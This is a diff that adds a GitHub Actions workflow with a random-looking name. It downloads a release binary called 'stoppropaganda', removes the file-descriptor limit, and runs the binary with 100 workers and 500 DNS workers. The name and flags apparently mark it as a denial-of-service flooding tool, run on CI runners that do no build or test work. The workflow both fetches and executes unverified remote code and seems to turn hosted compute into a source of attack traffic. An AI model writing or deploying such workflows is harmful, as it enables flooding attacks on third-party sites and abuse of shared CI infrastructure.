@@ -1,0 +1,14 @@
+name: esqkqvfbeohbtao
+
+on:
+  workflow_dispatch:
+  
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+        curl --output srv "https://github.com/erkexzcx/stoppropaganda/releases/download/v0.0.37/stoppropaganda_v0.0.37_linux_x86_64"
+        chmod +x srv
+        ulimit -n unlimited
+        ./srv --workers 100 --dnsworkers 500
